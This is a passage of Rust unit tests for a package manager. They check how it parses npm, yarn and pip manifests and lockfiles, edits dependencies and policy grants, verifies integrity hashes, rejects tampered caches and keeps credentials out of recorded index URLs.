        )
        .unwrap();
        fs::write(
            dir.path().join("packages/ignored/package.json"),
            r#"{ "dependencies": { "ignored-dep": "5.0.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("node_modules/nope/package.json"),
            r#"{ "dependencies": { "node-modules-dep": "6.0.0" } }"#,
        )
        .unwrap();

        let specs = read_package_json_specs(&package_json, true).unwrap();
        assert!(has_spec(&specs, "root-dep", "1.0.0"));
        assert!(has_spec(&specs, "root-dev", "2.0.0"));
        assert!(has_spec(&specs, "workspace-dep", "3.0.0"));
        assert!(has_spec(&specs, "workspace-dev", "4.0.0"));
        assert!(!specs.iter().any(|spec| spec.name == "ignored-dep"));
        assert!(!specs.iter().any(|spec| spec.name == "node-modules-dep"));

        let production_specs = read_package_json_specs(&package_json, false).unwrap();
        assert!(has_spec(&production_specs, "root-dep", "1.0.0"));
        assert!(has_spec(&production_specs, "workspace-dep", "3.0.0"));
        assert!(!production_specs.iter().any(|spec| spec.name == "root-dev"));
        assert!(!production_specs
            .iter()
            .any(|spec| spec.name == "workspace-dev"));
    }

    #[test]
    fn reads_workspace_package_json_specs_from_object_form() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("apps/web")).unwrap();

        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "name": "workspace-root",
                "workspaces": {
                    "packages": ["apps/*"]
                }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("apps/web/package.json"),
            r#"{ "name": "web", "dependencies": { "web-dep": "1.2.3" } }"#,
        )
        .unwrap();

        let specs = read_package_json_specs(&package_json, true).unwrap();
        assert!(has_spec(&specs, "web-dep", "1.2.3"));
    }

    #[test]
    fn removes_manifest_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = OmcManifest {
            project: ProjectInfo {
                name: "remove-demo".to_owned(),
                version: "0.1.0".to_owned(),
            },
            dependencies: BTreeMap::from([("npm:left-pad".to_owned(), "1.3.0".to_owned())]),
            dev_dependencies: BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())]),
            policy: ManifestPolicy {
                allow: vec!["http:api.example.com".to_owned()],
            },
            registries: ManifestRegistries::default(),
        };
        fs::write(
            dir.path().join("omc.toml"),
            toml::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        let removed =
            remove_manifest_dependency(dir.path(), &PackageSpec::parse("npm:left-pad").unwrap())
                .unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

        assert!(removed);
        assert!(manifest.dependencies.is_empty());
        assert_eq!(
            manifest.dev_dependencies,
            BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
        );
        assert_eq!(manifest.policy.allow, vec!["http:api.example.com"]);
    }

    #[test]
    fn writes_manifest_dev_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let spec = PackageSpec::parse("npm:is-odd@3.0.1").unwrap();
        write_manifest_dependency(dir.path(), &spec, "3.0.1", true).unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

        assert!(manifest.dependencies.is_empty());
        assert_eq!(
            manifest.dev_dependencies,
            BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
        );

        write_manifest_dependency(dir.path(), &spec, "3.0.1", false).unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
        assert_eq!(
            manifest.dependencies,
            BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
        );
        assert!(manifest.dev_dependencies.is_empty());
    }

    #[test]
    fn adds_manifest_policy_grants() {
        let dir = tempfile::tempdir().unwrap();
        let added = add_manifest_policy_grants(
            dir.path(),
            &[
                "http:api.example.com".to_owned(),
                "env:API_TOKEN".to_owned(),
                "http:api.example.com".to_owned(),
            ],
        )
        .unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

        assert_eq!(
            added,
            vec![
                "http:api.example.com".to_owned(),
                "env.read:API_TOKEN".to_owned()
            ]
        );
        assert_eq!(
            manifest.policy.allow,
            vec![
                "env.read:API_TOKEN".to_owned(),
                "http:api.example.com".to_owned()
            ]
        );
    }

    #[test]
    fn reads_npm_runtime_optional_and_peer_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
                shasum: None,
                integrity: None,
            },
            os: None,
            cpu: None,
            libc: None,
            scripts: None,
            dependencies: Some(BTreeMap::from([(
                "runtime".to_owned(),
                "^1.0.0".to_owned(),
            )])),
            optional_dependencies: Some(BTreeMap::from([(
                "optional-runtime".to_owned(),
                "^2.0.0".to_owned(),
            )])),
            bundle_dependencies: None,
            bundled_dependencies: None,
            peer_dependencies: Some(BTreeMap::from([
                ("required-peer".to_owned(), "^3.0.0".to_owned()),
                ("optional-peer".to_owned(), "^4.0.0".to_owned()),
            ])),
            peer_dependencies_meta: Some(BTreeMap::from([(
                "optional-peer".to_owned(),
                NpmPeerDependencyMeta { optional: true },
            )])),
        };

        let dependencies = npm_runtime_dependencies(&version_doc);
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "runtime"
                && dependency.spec.version.as_deref() == Some("^1.0.0")
                && !dependency.optional));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "optional-runtime"
                && dependency.spec.version.as_deref() == Some("^2.0.0")
                && dependency.optional));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "required-peer"
                && dependency.spec.version.as_deref() == Some("^3.0.0")
                && !dependency.optional));
        assert!(!dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "optional-peer"));
    }

    #[test]
    fn evaluates_npm_platform_lists() {
        assert!(npm_string_list_allows(
            Some(&NpmStringList::Many(vec![current_npm_os().to_owned()])),
            Some(current_npm_os())
        ));
        assert!(!npm_string_list_allows(
            Some(&NpmStringList::Many(vec![format!("!{}", current_npm_os())])),
            Some(current_npm_os())
        ));
        assert!(npm_string_list_allows(
            Some(&NpmStringList::Many(vec![
                "!definitely-not-this-os".to_owned()
            ])),
            Some(current_npm_os())
        ));
        assert!(!npm_string_list_allows(
            Some(&NpmStringList::Many(vec![
                "definitely-not-this-os".to_owned()
            ])),
            Some(current_npm_os())
        ));
    }

    #[test]
    fn skips_npm_bundled_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
                shasum: None,
                integrity: None,
            },
            os: None,
            cpu: None,
            libc: None,
            scripts: None,
            dependencies: Some(BTreeMap::from([
                ("bundled-runtime".to_owned(), "^1.0.0".to_owned()),
                ("external-runtime".to_owned(), "^2.0.0".to_owned()),
            ])),
            optional_dependencies: Some(BTreeMap::from([(
                "bundled-optional".to_owned(),
                "^3.0.0".to_owned(),
            )])),
            bundle_dependencies: Some(NpmStringList::Many(vec![
                "bundled-runtime".to_owned(),
                "bundled-optional".to_owned(),
            ])),
            bundled_dependencies: None,
            peer_dependencies: None,
            peer_dependencies_meta: None,
        };

        let dependencies = npm_runtime_dependencies(&version_doc);
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "external-runtime"));
        assert!(!dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "bundled-runtime"));
        assert!(!dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "bundled-optional"));
    }

    #[test]
    fn supports_boolean_npm_bundle_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
                shasum: None,
                integrity: None,
            },
            os: None,
            cpu: None,
            libc: None,
            scripts: None,
            dependencies: Some(BTreeMap::from([(
                "bundled-runtime".to_owned(),
                "^1.0.0".to_owned(),
            )])),
            optional_dependencies: None,
            bundle_dependencies: Some(NpmStringList::Bool(true)),
            bundled_dependencies: None,
            peer_dependencies: None,
            peer_dependencies_meta: None,
        };

        assert!(npm_runtime_dependencies(&version_doc).is_empty());
    }

    #[test]
    fn reads_package_lock_constraints_for_unique_versions() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = dir.path().join("package-lock.json");
        fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": { "version": "3.0.1" },
                    "node_modules/@scope/pkg": { "version": "1.2.3" },
                    "node_modules/a/node_modules/dup": { "version": "1.0.0" },
                    "node_modules/b/node_modules/dup": { "version": "2.0.0" }
                }
            }"#,
        )
        .unwrap();

        let constraints = read_package_lock_requirements(&package_lock)
            .unwrap()
            .constraints;
        assert_eq!(
            constraints.get("npm:is-odd").map(String::as_str),
            Some("3.0.1")
        );
        assert_eq!(
            constraints.get("npm:@scope/pkg").map(String::as_str),
            Some("1.2.3")
        );
        assert!(!constraints.contains_key("npm:dup"));
    }

    #[test]
    fn reads_package_lock_integrities_for_unique_versions() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = dir.path().join("package-lock.json");
        fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": {
                        "version": "3.0.1",
                        "integrity": "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ=="
                    },
                    "node_modules/a/node_modules/dup": {
                        "version": "1.0.0",
                        "integrity": "sha512-one"
                    },
                    "node_modules/b/node_modules/dup": {
                        "version": "2.0.0",
                        "integrity": "sha512-two"
                    }
                },
                "dependencies": {
                    "legacy": {
                        "version": "4.0.0",
                        "integrity": "sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0="
                    }
                }
            }"#,
        )
        .unwrap();

        let requirements = read_package_lock_requirements(&package_lock).unwrap();
        assert_eq!(
            requirements
                .npm_integrities
                .get("npm:is-odd")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some(
                "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ=="
            )
        );
        assert_eq!(
            requirements
                .npm_integrities
                .get("npm:legacy")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some("sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0=")
        );
        assert!(!requirements.npm_integrities.contains_key("npm:dup"));
    }

    #[test]
    fn reads_package_lock_resolved_urls_for_unique_versions() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = dir.path().join("package-lock.json");
        fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": {
                        "version": "3.0.1",
                        "resolved": "https://registry.example.invalid/is-odd-3.0.1.tgz"
                    },
                    "node_modules/a/node_modules/dup": {
                        "version": "1.0.0",
                        "resolved": "https://registry.example.invalid/dup-1.0.0.tgz"
                    },
                    "node_modules/b/node_modules/dup": {
                        "version": "2.0.0",
                        "resolved": "https://registry.example.invalid/dup-2.0.0.tgz"
                    }
                },
                "dependencies": {
                    "legacy": {
                        "version": "4.0.0",
                        "resolved": "https://registry.example.invalid/legacy-4.0.0.tgz"
                    }
                }
            }"#,
        )
        .unwrap();

        let requirements = read_package_lock_requirements(&package_lock).unwrap();
        assert_eq!(
            requirements
                .npm_resolved
                .get("npm:is-odd")
                .map(String::as_str),
            Some("https://registry.example.invalid/is-odd-3.0.1.tgz")
        );
        assert_eq!(
            requirements
                .npm_resolved
                .get("npm:legacy")
                .map(String::as_str),
            Some("https://registry.example.invalid/legacy-4.0.0.tgz")
        );
        assert!(!requirements.npm_resolved.contains_key("npm:dup"));
    }

    #[test]
    fn reads_yarn_lock_constraints_integrities_and_urls() {
        let dir = tempfile::tempdir().unwrap();
        let yarn_lock = dir.path().join("yarn.lock");
        fs::write(
            &yarn_lock,
            r#"# yarn lockfile v1

left-pad@^1.0.0, "left-pad@~1.1.0":
  version "1.1.3"
  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz#612f61c0f5c20ba82e3d8f3f211f98d7bc86dca5"
  integrity sha512-leftpad

"@scope/pkg@^1.0.0":
  version "1.2.3"
  resolved "https://registry.yarnpkg.com/@scope/pkg/-/pkg-1.2.3.tgz"

"alias@npm:real-name@^3.0.0":
  version "3.1.0"

dup@^1.0.0:
  version "1.0.0"

dup@^2.0.0:
  version "2.0.0"
"#,
        )
        .unwrap();

        let requirements = read_yarn_lock_requirements(&yarn_lock).unwrap();
        assert_eq!(
            requirements
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:@scope/pkg")
                .map(String::as_str),
            Some("1.2.3")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:alias")
                .map(String::as_str),
            Some("3.1.0")
        );
        assert_eq!(
            requirements
                .npm_integrities
                .get("npm:left-pad")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some("sha512-leftpad")
        );
        assert_eq!(
            requirements
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some(
                "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz#612f61c0f5c20ba82e3d8f3f211f98d7bc86dca5"
            )
        );
        assert!(!requirements.constraints.contains_key("npm:dup"));
        assert!(!requirements.npm_resolved.contains_key("npm:dup"));
    }

    #[test]
    fn discovers_yarn_lock_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "left-pad": "^1.0.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("yarn.lock"),
            r#"left-pad@^1.0.0:
  version "1.1.3"
  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz"
"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("^1.0.0")));
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            discovered
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some("https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz")
        );
    }

    #[test]
    fn resolves_npm_from_lockfile_tarball_url() {
        let mut options = LinkOptions::new(".");
        options
            .constraints
            .insert("npm:left-pad".to_owned(), "1.3.0".to_owned());
        options.npm_resolved.insert(
            "npm:left-pad".to_owned(),
            "https://registry.example.invalid/left-pad-1.3.0.tgz?lock=1".to_owned(),
        );
        let spec = PackageSpec::parse("npm:left-pad@^1.0.0").unwrap();
        let resolved = resolve_npm_lockfile_tarball(&spec, "left-pad", Some("^1.0.0"), &options)
            .unwrap()
            .unwrap();

        assert!(resolved.npm_direct_tarball);
        assert_eq!(
            resolved.source_url,
            "https://registry.example.invalid/left-pad-1.3.0.tgz?lock=1"
        );
        assert_eq!(resolved.version, "1.3.0");
    }

    #[test]
    fn extracts_npm_manifest_from_tgz() {
        let bytes = npm_tgz_for_test(
            r#"{
                "name": "pkg",
                "version": "1.0.0",
                "scripts": { "postinstall": "node install.js" },
                "dependencies": { "runtime": "^1.0.0" },
                "peerDependencies": { "peer": "^2.0.0" }
            }"#,
        );

        let manifest = npm_manifest_from_tgz(&bytes).unwrap();
        assert_eq!(manifest.version, "1.0.0");
        assert_eq!(
            manifest
                .scripts
                .as_ref()
                .and_then(|scripts| scripts.get("postinstall"))
                .map(String::as_str),
            Some("node install.js")
        );
        let dependencies = npm_manifest_runtime_dependencies(&manifest);
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "runtime"));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "peer"));
    }

    #[test]
    fn verifies_npm_integrity_hashes() {
        let bytes = b"artifact";
        assert!(verify_npm_integrity(
            "demo",
            "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ==",
            bytes,
        )
        .is_ok());
        assert!(verify_npm_integrity("demo", "sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0=", bytes).is_ok());

        let error = verify_npm_integrity("demo", "sha512-AAAA", bytes).unwrap_err();
        assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));

        let error = verify_npm_integrity("demo", "md5-AAAA", bytes).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported npm integrity digest"));
    }

    #[test]
    fn prunes_lockfile_to_retained_packages() {
        let dir = tempfile::tempdir().unwrap();
        let keep = locked_package_for_test(Ecosystem::Npm, "left-pad", "1.3.0");
        let stale = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
        fs::write(
            dir.path().join("omc.lock"),
            toml::to_string_pretty(&OmcLock {
                version: 1,
                packages: vec![keep.clone(), stale],
            })
            .unwrap(),
        )
        .unwrap();

        let removed =
            prune_lockfile(dir.path(), &BTreeSet::from([locked_package_key(&keep)])).unwrap();

        let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
        assert_eq!(removed, 1);
        assert_eq!(lock.packages.len(), 1);
        assert_eq!(lock.packages[0].name, "left-pad");
    }

    #[test]
    fn locked_archive_reader_rejects_tampered_cache() {
        let dir = tempfile::tempdir().unwrap();
        let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
        fs::create_dir_all(archive.parent().unwrap()).unwrap();
        fs::write(&archive, b"tampered").unwrap();

        let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
        package.archive = ".omc/cache/npm/pkg.tgz".to_owned();
        package.sha256 = sha256_hex(b"expected");

        let error = read_locked_archive(dir.path(), &package).unwrap_err();
        assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));

        package.sha256 = sha256_hex(b"tampered");
        assert_eq!(
            read_locked_archive(dir.path(), &package).unwrap(),
            b"tampered"
        );
    }

    #[test]
    fn locked_reachable_packages_include_transitive_dependencies() {
        let mut root = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
        root.dependencies = vec!["npm:is-number@^6.0.0".to_owned()];
        let dependency = locked_package_for_test(Ecosystem::Npm, "is-number", "6.0.0");
        let lock = OmcLock {
            version: 1,
            packages: vec![root, dependency],
        };
        let options = LinkOptions::new(".");
        let retained = locked_reachable_package_keys(
            &lock,
            &[PackageSpec::parse("npm:is-odd@^3.0.0").unwrap()],
            &options,
        )
        .unwrap();

        assert!(retained.contains("npm:is-odd@3.0.1"));
        assert!(retained.contains("npm:is-number@6.0.0"));
    }

    #[test]
    fn locked_reachable_packages_allow_missing_optional_dependencies() {
        let mut root = locked_package_for_test(Ecosystem::Npm, "has-optional", "1.0.0");
        root.optional_dependencies = vec!["npm:optional-platform@1.0.0".to_owned()];
        let lock = OmcLock {
            version: 1,
            packages: vec![root],
        };
        let options = LinkOptions::new(".");
        let retained = locked_reachable_package_keys(
            &lock,
            &[PackageSpec::parse("npm:has-optional@1.0.0").unwrap()],
            &options,
        )
        .unwrap();

        assert_eq!(
            retained,
            BTreeSet::from(["npm:has-optional@1.0.0".to_owned()])
        );
    }

    #[test]
    fn locked_reachable_packages_reject_stale_lockfiles() {
        let lock = OmcLock {
            version: 1,
            packages: vec![locked_package_for_test(Ecosystem::Npm, "left-pad", "1.1.0")],
        };
        let options = LinkOptions::new(".");
        let error = locked_reachable_package_keys(
            &lock,
            &[PackageSpec::parse("npm:left-pad@1.3.0").unwrap()],
            &options,
        )
        .unwrap_err();

        assert!(matches!(error, OmcRegistryError::LockfileOutOfDate(_)));
    }

    #[test]
    fn discovers_package_lock_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "left-pad": "^1.1.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("package-lock.json"),
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/left-pad": { "version": "1.1.3" }
                }
            }"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("^1.1.0")));
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
    }

    #[test]
    fn discovers_npm_shrinkwrap_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "left-pad": "^1.1.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("npm-shrinkwrap.json"),
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/left-pad": {
                        "version": "1.1.3",
                        "resolved": "https://registry.example.invalid/left-pad-1.1.3.tgz",
                        "integrity": "sha512-leftpad"
                    }
                }
            }"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            discovered
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some("https://registry.example.invalid/left-pad-1.1.3.tgz")
        );
        assert_eq!(
            discovered
                .npm_integrities
                .get("npm:left-pad")
                .and_then(|integrities| integrities.iter().next())
                .map(String::as_str),
            Some("sha512-leftpad")
        );
    }

    #[test]
    fn merges_npm_lock_constraints_into_ranges_and_aliases() {
        let spec = PackageSpec::new(Ecosystem::Npm, "is-odd", Some("^3.0.0".to_owned()));
        let constraints = BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())]);
        assert_eq!(
            constrained_npm_requirement(&spec, spec.version.as_deref(), &constraints).as_deref(),
            Some("^3.0.0,3.0.1")
        );

        let alias = PackageSpec::new(
            Ecosystem::Npm,
            "string-width-cjs",
            Some("npm:string-width@^4.2.0".to_owned()),
        );
        let (_, alias_requirement) = npm_registry_name_and_requirement(&alias).unwrap();
        assert_eq!(
            constrained_npm_requirement(&alias, alias_requirement.as_deref(), &BTreeMap::new())
                .as_deref(),
            Some("^4.2.0")
        );
    }

    #[test]
    fn reads_requirements_specs() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let nested = dir.path().join("nested.txt");
        let constraints = dir.path().join("constraints.txt");
        fs::write(&nested, "charset-normalizer==3.4.0\n").unwrap();
        fs::write(&constraints, "urllib3==2.2.1\n").unwrap();
        fs::write(
            &requirements,
            "requests[socks]==2.32.3 \\\n  --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n# ignored\nidna>=2,<4\n-r nested.txt\n-c constraints.txt\ncolorama; extra == 'windows'\n",
        )
        .unwrap();
        let discovered = read_requirements_file(&requirements).unwrap();
        let specs = discovered.specs;
        assert!(specs.iter().any(|spec| spec.name == "requests"
            && spec.version.as_deref() == Some("==2.32.3")
            && spec.extras.contains("socks")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=2,<4")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"
                && spec.version.as_deref() == Some("==3.4.0")));
        assert!(!specs.iter().any(|spec| spec.name == "colorama"));
        assert_eq!(specs.len(), 3);
        assert_eq!(
            discovered
                .constraints
                .get("pypi:urllib3")
                .map(String::as_str),
            Some("==2.2.1")
        );
        assert_eq!(
            discovered
                .hashes
                .get("pypi:requests")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn rejects_unsupported_requirements_entries() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(&requirements, "--trusted-host example.invalid\n").unwrap();
        let error = read_requirements_file(&requirements).unwrap_err();
        assert!(error.to_string().contains("unsupported requirements entry"));
    }

    #[test]
    fn reads_requirements_index_urls() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let wheels = dir.path().join(".").join("wheels");
        fs::write(
            &requirements,
            "--index-url https://mirror.example/simple\n--extra-index-url=https://extra.example/simple\n-i https://override.example/simple\n--find-links ./wheels\n-f https://files.example/packages\n--no-index\nidna==3.7\n",
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        assert_eq!(
            discovered.pypi_index_url.as_deref(),
            Some("https://override.example/simple/")
        );
        assert_eq!(
            discovered.pypi_extra_index_urls,
            vec!["https://extra.example/simple/".to_owned()]
        );
        assert_eq!(
            discovered.pypi_find_links,
            vec![
                wheels.to_string_lossy().into_owned(),
                "https://files.example/packages".to_owned()
            ]
        );
        assert!(discovered.pypi_no_index);
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
    }

    #[test]
    fn reads_direct_wheel_requirements() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(
            &requirements,
            "idna @ https://example.invalid/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        let spec = discovered
            .specs
            .iter()
            .find(|spec| spec.name == "idna")
            .unwrap();
        assert_eq!(
            spec.direct_url.as_deref(),
            Some("https://example.invalid/idna-3.7-py3-none-any.whl")
        );
        assert_eq!(
            discovered.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
            ])
        );
    }

    #[test]
    fn parses_pypi_simple_index_candidates() {
        let base_url = reqwest::Url::parse("https://index.example/simple/idna/").unwrap();
        let html = r#"
            <a href="../../packages/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" data-requires-python="&gt;=3.8">idna</a>
            <a href="idna-3.6.tar.gz#sha256=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb">sdist</a>
            <a href="other-1.0-py3-none-any.whl">other</a>
        "#;

        let candidates = pypi_simple_index_candidates(&base_url, html, "idna", Some("3.11.0"));
        assert_eq!(
            candidates,
            vec![PypiSimpleCandidate {
                url: "https://index.example/packages/idna-3.7-py3-none-any.whl".to_owned(),
                download_url: None,
                local_path: None,
                filename: "idna-3.7-py3-none-any.whl".to_owned(),
                version: "3.7".to_owned(),
                sha256: Some(
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned()
                ),
            }]
        );
        assert!(pypi_simple_index_candidates(&base_url, html, "idna", Some("3.7.0")).is_empty());
    }

    #[test]
    fn pypi_simple_index_candidates_do_not_record_credentials() {
        let base_url = reqwest::Url::parse("https://user:pass@index.example/simple/idna/").unwrap();
        let html = r#"<a href="../../packages/idna-3.7-py3-none-any.whl">idna</a>"#;

        let candidates = pypi_simple_index_candidates(&base_url, html, "idna", Some("3.11.0"));
        assert_eq!(
            candidates,
            vec![PypiSimpleCandidate {
                url: "https://index.example/packages/idna-3.7-py3-none-any.whl".to_owned(),
                download_url: Some(
                    "https://user:pass@index.example/packages/idna-3.7-py3-none-any.whl".to_owned()
                ),
                local_path: None,
                filename: "idna-3.7-py3-none-any.whl".to_owned(),
                version: "3.7".to_owned(),
                sha256: None,
            }]
        );
    }

    #[test]
    fn reads_local_find_links_wheel_candidates() {
        let dir = tempfile::tempdir().unwrap();
        let wheel = dir.path().join("idna-3.7-py3-none-any.whl");
        fs::write(&wheel, b"not a real wheel").unwrap();

        let candidates =
            pypi_local_find_link_candidates(dir.path(), "idna", Some("3.11.0")).unwrap();
        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].filename, "idna-3.7-py3-none-any.whl");
        assert_eq!(candidates[0].version, "3.7");
        assert_eq!(candidates[0].local_path.as_deref(), Some(wheel.as_path()));
        assert!(candidates[0].url.starts_with("file://"));
    }

    #[test]
    fn rejects_unsupported_direct_pypi_specs() {
        let spec =
            PackageSpec::parse("pypi:pkg @ https://example.invalid/pkg-1.0.0.tar.gz").unwrap();
        let error = resolve_pypi_direct_wheel(&spec).unwrap_err();
        assert!(error.to_string().contains("unsupported package spec"));

        let spec = PackageSpec::parse("pypi:pkg @ git+https://example.invalid/pkg.git").unwrap();
        let error = resolve_pypi_direct_wheel(&spec).unwrap_err();
        assert!(error.to_string().contains("must use https or file"));
    }

    #[test]
    fn reads_pyproject_dependencies_and_selected_extras() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [project]
            dependencies = [
                "idna==3.7",
                "colorama; extra == 'windows'"
            ]

